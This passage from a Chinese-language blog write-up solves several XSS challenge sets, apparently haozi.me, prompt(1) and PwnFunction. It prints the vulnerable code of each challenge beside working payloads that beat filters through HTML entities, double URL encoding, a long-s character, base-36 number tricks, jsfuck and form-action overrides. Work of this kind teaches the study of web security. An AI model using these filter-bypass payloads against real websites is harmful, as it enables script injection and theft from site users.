class=\"line\">&lt;svg/onload=&quot;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;(1)&quot;&gt;</span><br><span class=\"line\">&lt;scripscriptt src=&quot;https://xss.haozi.me/j.js&quot;&gt;&lt;/scripscriptt&gt;</span><br><span class=\"line\">&lt;cript src=&quot;https://xss.haozi.me/j.js&quot;&gt;&lt;/cript&gt;</span><br></pre></td></tr></table></figure>\n<p>0x0C</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">同0x0B</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>0x0D</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">111</span><br><span class=\"line\">alert(1)</span><br><span class=\"line\">--&gt; </span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220912152740785.png\" alt=\"image-20220912152740785\"></p>\n<p>0x0E</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ſ用在有转大写时</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;ſcript src=&quot;https://xss.haozi.me/j.js&quot;&gt;&lt;/ſcript&gt;</span><br><span class=\"line\">&lt;ſvg onload=&quot;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;&quot;&gt;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>0x0F</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1&#x27;);alert(1)//</span><br></pre></td></tr></table></figure>\n<p>0x10</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">执行 `中的代码,es6模板字符串</span><br><span class=\"line\"></span><br><span class=\"line\">alert(1)</span><br></pre></td></tr></table></figure>\n<p>0x11</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&quot;?;alert(1)/.</span><br></pre></td></tr></table></figure>\n<h2 id=\"prompt1\"><a class=\"markdownIt-Anchor\" href=\"#prompt1\">#</a> prompt(1)</h2>\n<p>2</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">eval.call</span><br><span class=\"line\">prompt`1`</span><br><span class=\"line\">&lt;svg&gt;&lt;script&gt;prompt&amp;#40;1)   切换命名空间</span><br><span class=\"line\">最好不要编码符号</span><br></pre></td></tr></table></figure>\n<p>5</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">aaa&quot; onerror</span><br><span class=\"line\">=&quot;prompt(1)&quot; src=111 type=&quot;image </span><br></pre></td></tr></table></figure>\n<p>6</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;form&gt;中注入</span><br><span class=\"line\">// e.g. http://httpbin.org/post#&#123;&quot;name&quot;:&quot;Matt&quot;&#125;</span><br><span class=\"line\">&lt;form action=&quot;http://httpbin.org/post&quot; method=&quot;post&quot;&gt;&lt;input name=&quot;name&quot; value=&quot;Matt&quot;&gt;&lt;/form&gt;</span><br><span class=\"line\">javascript:prompt(1)#&#123;&quot;action&quot;:&quot;Matt&quot;&#125;</span><br><span class=\"line\">&lt;form action=&quot;javascript:prompt(1)&quot; method=&quot;post&quot;&gt;&lt;input name=&quot;action&quot; value=&quot;Matt&quot;&gt;&lt;/form&gt;     </span><br><span class=\"line\">通过input action覆盖form action</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;script&gt;                                                  \\n\\</span><br><span class=\"line\">    // forbid javascript: or vbscript: and data: stuff    \\n\\</span><br><span class=\"line\">    if (!/script:|data:/i.test(document.forms[0].action)) \\n\\</span><br><span class=\"line\">        document.forms[0].submit();                       \\n\\</span><br><span class=\"line\">    else                                                  \\n\\</span><br><span class=\"line\">        document.write(&quot;Action forbidden.&quot;)               \\n\\</span><br><span class=\"line\">&lt;/script&gt;   </span><br></pre></td></tr></table></figure>\n<p>7</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&quot;&gt;&lt;script&gt;/*#*/prompt/*#*/(1)/*#*/&lt;/script&gt;</span><br><span class=\"line\">&lt;p class=&quot;comment&quot; title=&quot;&quot;&gt;&lt;script&gt;/*&quot;&gt;&lt;/p&gt;</span><br><span class=\"line\">&lt;p class=&quot;comment&quot; title=&quot;*/prompt/*&quot;&gt;&lt;/p&gt;</span><br><span class=\"line\">&lt;p class=&quot;comment&quot; title=&quot;*/(1)/*&quot;&gt;&lt;/p&gt;</span><br><span class=\"line\">&lt;p class=&quot;comment&quot; title=&quot;*/&lt;/script&gt;&quot;&gt;&lt;/p&gt;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>8</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">U+005C:反斜杠(reverse solidus)</span><br><span class=\"line\">U+000D:回车 (carriage return)</span><br><span class=\"line\">U+2028:行分隔符(line separator)</span><br><span class=\"line\">U+2029∶段分隔符(paragraph separator)</span><br><span class=\"line\">u+000A:换行符（line feed)</span><br><span class=\"line\">&#x27;\\u2028prompt(1)\\u2028--&gt;&#x27;</span><br></pre></td></tr></table></figure>\n<p>10</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">prom&#x27;pt(1)</span><br></pre></td></tr></table></figure>\n<p>11</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&quot;(prompt(1))in&quot;</span><br></pre></td></tr></table></figure>\n<p>12</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">parseInt  转为x进制数的十进制数,x范围为2-36</span><br><span class=\"line\">36 = [a-z] + [0-9]</span><br><span class=\"line\">如果第一个字符不能转为进制返回nan</span><br><span class=\"line\">p = 10+16</span><br><span class=\"line\">parseInt(&#x27;prompt&#x27;,30)</span><br><span class=\"line\">进制数必须大于30，必须要大于t的进制数 t = 10 + 20</span><br><span class=\"line\">parseInt(&#x27;p&#x27;,25)</span><br><span class=\"line\">NaN</span><br><span class=\"line\">parseInt(&#x27;p&#x27;,26)</span><br><span class=\"line\">25</span><br><span class=\"line\">parseInt(&#x27;p&#x27;,27)</span><br><span class=\"line\">25</span><br><span class=\"line\">parseInt(&#x27;p&#x27;,36)</span><br><span class=\"line\">25</span><br><span class=\"line\">parseInt(&#x27;prompt&#x27;,29)</span><br><span class=\"line\">18361375</span><br><span class=\"line\">parseInt(&#x27;prompt&#x27;,30)</span><br><span class=\"line\">630038579</span><br><span class=\"line\">18361375..toString(29)</span><br><span class=\"line\">&#x27;promp&#x27;</span><br><span class=\"line\">630038579..toString(30)</span><br><span class=\"line\">&#x27;prompt&#x27;</span><br><span class=\"line\">r是28进制数，如果27仍是p的结果</span><br><span class=\"line\"></span><br><span class=\"line\">eval(630038579..toString(30))(1)</span><br><span class=\"line\"></span><br><span class=\"line\">eval(&#x27;prompt&#x27;)</span><br><span class=\"line\">ƒ prompt() &#123; [native code] &#125;</span><br><span class=\"line\">a = eval(&#x27;prompt&#x27;)</span><br><span class=\"line\">ƒ prompt() &#123; [native code] &#125;</span><br><span class=\"line\">a(1)</span><br><span class=\"line\">&#x27;&#x27;</span><br></pre></td></tr></table></figure>\n<p>F</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">svg命名空间中使用xml语法，且xml注释和html注释一样</span><br><span class=\"line\">&quot;&gt;&lt;svg&gt;....</span><br><span class=\"line\">如果不进行命名空间切换，script无法识别html注释</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>写在最前：</p>\n<p>做 pwnfunction 时时刻注意：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1.</span><br><span class=\"line\">name = &quot;&lt;script&gt;alert(&#x27;I am John in an annoying alert!&#x27;)&lt;/script&gt;&quot;;</span><br><span class=\"line\">el.innerHTML = name; // harmless in this case</span><br><span class=\"line\">这种看似xss的方式是行不通的</span><br><span class=\"line\">HTML 5 中指定不执行由 innerHTML 插入的 &lt;script&gt; 标签。</span><br><span class=\"line\">然而，有很多不依赖 &lt;script&gt; 标签去执行 JavaScript 的方式。所以当你使用innerHTML 去设置你无法控制的字符串时，这仍然是一个安全问题。例如：</span><br><span class=\"line\">const name = &quot;&lt;img src=&#x27;x&#x27; onerror=&#x27;alert(1)&#x27;&gt;&quot;;</span><br><span class=\"line\">el.innerHTML = name; // shows the alert</span><br><span class=\"line\">Copy to Clipboard</span><br><span class=\"line\">基于这个原因，当插入纯文本时，建议不要使用 innerHTML 。取而代之的是使用 Node.textContent ，它不会把给定的内容解析为 HTML，它仅仅是将原始文本插入给定的位置。</span><br><span class=\"line\"></span><br><span class=\"line\">2.</span><br><span class=\"line\"> 如果一个 &lt;div&gt;, &lt;span&gt;, 或 &lt;noembed&gt; 节点有一个文本子节点，该节点包含字符 (&amp;), (&lt;), 或 (&gt;), innerHTML 将这些字符分别返回为 &amp;amp;, &amp;lt; 和 &amp;gt;。使用Node.textContent 可获取一个这些文本节点内容的正确副本。</span><br></pre></td></tr></table></figure>\n<h2 id=\"ma-spaghet\"><a class=\"markdownIt-Anchor\" href=\"#ma-spaghet\">#</a> Ma Spaghet</h2>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">somebody = &lt;script&gt;alert(1)&lt;/script&gt;</span><br><span class=\"line\">尽管这看上去像cross-site scripting攻击，结果并不会导致什么。HTML 5中指定不执行由innerHTML插入的&lt;script&gt;标签。</span><br><span class=\"line\">然而，有很多不依赖&lt;script&gt;标签去执行JavaScript的方式。所以当你使用innerHTML去设置你无法控制的字符串时，这仍然是一个安全问题。例如:&lt;img&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;h2 id=&quot;spaghet&quot;&gt;&lt;/h2&gt;</span><br><span class=\"line\">&lt;script&gt;</span><br><span class=\"line\">    spaghet.innerHTML = (new URL(location).searchParams.get(&#x27;somebody&#x27;) || &quot;Somebody&quot;) + &quot; Toucha Ma Spaghet!&quot;</span><br><span class=\"line\">&lt;/script&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;svg onload=alert(1337)&gt;</span><br></pre></td></tr></table></figure>\n<h2 id=\"jefff\"><a class=\"markdownIt-Anchor\" href=\"#jefff\">#</a> Jefff</h2>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9kZXZlbG9wZXIubW96aWxsYS5vcmcvemgtQ04vZG9jcy9XZWIvSmF2YVNjcmlwdC9SZWZlcmVuY2UvR2xvYmFsX09iamVjdHMvZXZhbA==\">eval() - JavaScript | MDN (mozilla.org)</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9zb3VyY2VncmFwaC5jb20vZ2l0aHViLmNvbS93YW5nZG9jL2phdmFzY3JpcHQtdHV0b3JpYWwvLS9ibG9iL2RvY3MvdHlwZXMvZnVuY3Rpb24ubWQ=\">function.md - wangdoc/javascript-tutorial - Sourcegraph</span></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;h2 id=&quot;maname&quot;&gt;&lt;/h2&gt;</span><br><span class=\"line\">&lt;script&gt;</span><br><span class=\"line\">    let jeff = (new URL(location).searchParams.get(&#x27;jeff&#x27;) || &quot;JEFFF&quot;)</span><br><span class=\"line\">    let ma = &quot;&quot;</span><br><span class=\"line\">    eval(`ma = &quot;Ma name $&#123;jeff&#125;&quot;`)</span><br><span class=\"line\">    setTimeout(_ =&gt; &#123;</span><br><span class=\"line\">        maname.innerText = ma</span><br><span class=\"line\">    &#125;, 1000)</span><br><span class=\"line\">&lt;/script&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">eval([&quot;&quot;,&quot;&quot;],prompt(1))</span><br><span class=\"line\">(2) [&#x27;&#x27;, &#x27;&#x27;]</span><br><span class=\"line\">eval([&quot;&quot;,&quot;&quot;],&#x27;aaaaa&#x27;)</span><br><span class=\"line\">(2) [&#x27;&#x27;, &#x27;&#x27;]</span><br><span class=\"line\">//eval没有tostring方法，会返回数组形式的第一个参数</span><br><span class=\"line\">如果eval的参数不是字符串，那么会原样返回。</span><br><span class=\"line\"></span><br><span class=\"line\">1&quot;;alert(1)//</span><br><span class=\"line\">1&quot;,alert(1)//</span><br><span class=\"line\">jeff=&quot;-alert(1)-&quot;</span><br><span class=\"line\">在js中-两边都是表达式，则可以执行代码</span><br><span class=\"line\">先闭合Ma name 1&quot; 再用,或者;分割作为eval第二个参数，实现上面那个例子的弹窗</span><br></pre></td></tr></table></figure>\n<h2 id=\"da-wey\"><a class=\"markdownIt-Anchor\" href=\"#da-wey\">#</a> da-wey</h2>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;div id=&quot;uganda&quot;&gt;&lt;/div&gt;</span><br><span class=\"line\">&lt;script&gt;</span><br><span class=\"line\">    let wey = (new URL(location).searchParams.get(&#x27;wey&#x27;) || &quot;do you know da wey?&quot;);</span><br><span class=\"line\">    wey = wey.replace(/[&lt;&gt;]/g, &#x27;&#x27;)</span><br><span class=\"line\">    uganda.innerHTML = `&lt;input type=&quot;text&quot; placeholder=&quot;$&#123;wey&#125;&quot; class=&quot;form-control&quot;&gt;`</span><br><span class=\"line\">&lt;/script&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">?wey=1&quot; onfocus=alert(1) autofocus//</span><br></pre></td></tr></table></figure>\n<h2 id=\"ricardo\"><a class=\"markdownIt-Anchor\" href=\"#ricardo\">#</a> ricardo</h2>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;form id=&quot;ricardo&quot; method=&quot;GET&quot;&gt;</span><br><span class=\"line\">    &lt;input name=&quot;milos&quot; type=&quot;text&quot; class=&quot;form-control&quot; placeholder=&quot;True&quot; value=&quot;True&quot;&gt;</span><br><span class=\"line\">&lt;/form&gt;</span><br><span class=\"line\">&lt;script&gt;</span><br><span class=\"line\">    ricardo.action = (new URL(location).searchParams.get(&#x27;ricardo&#x27;) || &#x27;#&#x27;)</span><br><span class=\"line\">    setTimeout(_ =&gt; &#123;</span><br><span class=\"line\">        ricardo.submit()</span><br><span class=\"line\">    &#125;, 2000)</span><br><span class=\"line\">&lt;/script&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">ricardo=javascript:alert(1)</span><br><span class=\"line\"></span><br><span class=\"line\">效果类似于这样:</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;form id=&quot;ricardo&quot; method=&quot;GET&quot; action=&quot;javascript:alert(1)&quot;&gt;</span><br><span class=\"line\">    &lt;input name=&quot;milos&quot; type=&quot;text&quot; class=&quot;form-control&quot; placeholder=&quot;True&quot; value=&quot;True&quot;&gt;</span><br><span class=\"line\">    &lt;input type=&quot;submit&quot; value=&quot;submit&quot;&gt;</span><br><span class=\"line\">&lt;/form&gt;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h2 id=\"ah-thats-hawt\"><a class=\"markdownIt-Anchor\" href=\"#ah-thats-hawt\">#</a> Ah That’s Hawt</h2>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;h2 id=&quot;will&quot;&gt;&lt;/h2&gt;</span><br><span class=\"line\">&lt;script&gt;</span><br><span class=\"line\">    smith = (new URL(location).searchParams.get(&#x27;markassbrownlee&#x27;) || &quot;Ah That&#x27;s Hawt&quot;)</span><br><span class=\"line\">    smith = smith.replace(/[\\(\\`\\)\\\\]/g, &#x27;&#x27;)</span><br><span class=\"line\">    will.innerHTML = smith</span><br><span class=\"line\">&lt;/script&gt;</span><br><span class=\"line\">过滤了()`\\  </span><br><span class=\"line\">先html实体，在url编码</span><br><span class=\"line\">或者两次url编码</span><br><span class=\"line\">payload:</span><br><span class=\"line\">markassbrownlee=&lt;img%20src=1%20onerror=alert%26%2340%3B1%26%2341%3B&gt;</span><br><span class=\"line\">markassbrownlee=&lt;a href=&quot;javascript:alert%25281%2529&quot;&gt;a </span><br><span class=\"line\">markassbrownlee=%3Csvg%20onload%3D%22%26%23x61%3B%26%23x6C%3B%26%23x65%3B%26%23x72%3B%26%23x74%3B%26%23x28%3B%26%23x31%3B%26%23x33%3B%26%23x33%3B%26%23x37%3B%26%23x29%3B%22%3E  //两次编码svg中的alert1</span><br><span class=\"line\">href中js可以解析url编码,%28 %29</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h2 id=\"ligma\"><a class=\"markdownIt-Anchor\" href=\"#ligma\">#</a> Ligma</h2>\n<p><span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5qc2Z1Y2suY29tLw==\">http://www.jsfuck.com/</span></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">balls = (new URL(location).searchParams.get(&#x27;balls&#x27;) || &quot;Ninja has Ligma&quot;)</span><br><span class=\"line\">balls = balls.replace(/[A-Za-z0-9]/g, &#x27;&#x27;)</span><br><span class=\"line\">eval(balls)</span><br><span class=\"line\">jsfuck 注意编码，url中需要使用URL编码</span><br><span class=\"line\"></span><br><span class=\"line\">false       =&gt;  ![]</span><br><span class=\"line\">true        =&gt;  !![]</span><br><span class=\"line\">undefined   =&gt;  [][[]]</span><br><span class=\"line\">NaN         =&gt;  +[![]]</span><br><span class=\"line\">0           =&gt;  +[]</span><br><span class=\"line\">1           =&gt;  +!+[]</span><br><span class=\"line\">2           =&gt;  !+[]+!+[]</span><br><span class=\"line\">10          =&gt;  [+!+[]]+[+[]]</span><br><span class=\"line\">Array       =&gt;  []</span><br><span class=\"line\">Number      =&gt;  +[]</span><br><span class=\"line\">String      =&gt;  []+[]</span><br><span class=\"line\">Boolean     =&gt;  ![]</span><br><span class=\"line\">Function    =&gt;  [][&quot;filter&quot;]</span><br><span class=\"line\">eval        =&gt;  [][&quot;filter&quot;][&quot;constructor&quot;]( CODE )()</span><br><span class=\"line\">window      =&gt;  [][&quot;filter&quot;][&quot;constructor&quot;](&quot;return this&quot;)()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h2 id=\"mafia\"><a class=\"markdownIt-Anchor\" href=\"#mafia\">#</a> mafia</h2>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mafia = (new URL(location).searchParams.get(&#x27;mafia&#x27;) || &#x27;1+1&#x27;)</span><br><span class=\"line\">mafia = mafia.slice(0, 50)</span><br><span class=\"line\">mafia = mafia.replace(/[\\`\\&#x27;\\&quot;\\+\\-\\!\\\\\\[\\]]/gi, &#x27;_&#x27;)</span><br><span class=\"line\">mafia = mafia.replace(/alert/g, &#x27;_&#x27;)</span><br><span class=\"line\">eval(mafia)</span><br><span class=\"line\"></span><br><span class=\"line\">payload1:</span><br><span class=\"line\">eval(17795081..toString(36))(1)</span><br><span class=\"line\">原理：</span><br><span class=\"line\">17795081是parseInt(&quot;alert&quot;, 36);的结果，即先把alert转为进制数，在使用..toString转回来</span><br><span class=\"line\">parseInt(&quot;&quot;, ); 解析一个字符串并返回指定基数的十进制整数， radix 是2-36之间的整数，表示被解析字符串的基数。</span><br><span class=\"line\">36 = 10 + 26    10个数字+26个字母</span><br><span class=\"line\">alert中最大的是t，进制数为30，因此必须使用&gt;=30的进制数才能表示t</span><br><span class=\"line\">转换时使用thatNumber.toString(radix)函数。</span><br><span class=\"line\">前一篇prompt(1)详细解释过了</span><br><span class=\"line\"></span><br><span class=\"line\">payload2:</span><br><span class=\"line\">eval(location.hash.slice(1))</span><br><span class=\"line\">eval(location.hash.slice(1))#alert(1)</span><br><span class=\"line\">但这种方式需要user interaction</span><br><span class=\"line\">原理：</span><br><span class=\"line\">url.href = &#x27;https://developer.mozilla.org/en-US/search?q=URL#search-results-close-container&#x27;;</span><br><span class=\"line\">console.log(url.hash);      // #search-results-close-container</span><br><span class=\"line\"></span><br><span class=\"line\">payload3：</span><br><span class=\"line\">Function(/ALERT(1337)/.source.toLowerCase())()</span><br><span class=\"line\">利用构造函数</span><br></pre></td></tr></table></figure>\n<h2 id=\"area-51\"><a class=\"markdownIt-Anchor\" href=\"#area-51\">#</a> Area 51</h2>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;div id=&quot;pwnme&quot;&gt;&lt;/div&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;script&gt;</span><br><span class=\"line\">    var input = (new URL(location).searchParams.get(&#x27;debug&#x27;) || &#x27;&#x27;).replace(/[\\!\\-\\/\\#\\&amp;\\;\\%]/g, &#x27;_&#x27;);</span><br><span class=\"line\">    var template = document.createElement(&#x27;template&#x27;);</span><br><span class=\"line\">    template.innerHTML = input;</span><br><span class=\"line\">    pwnme.innerHTML = &quot;&lt;!-- &lt;p&gt; DEBUG: &quot; + template.outerHTML + &quot; &lt;/p&gt; --&gt;&quot;;</span><br><span class=\"line\">&lt;/script&gt;</span><br><span class=\"line\">分析：过滤 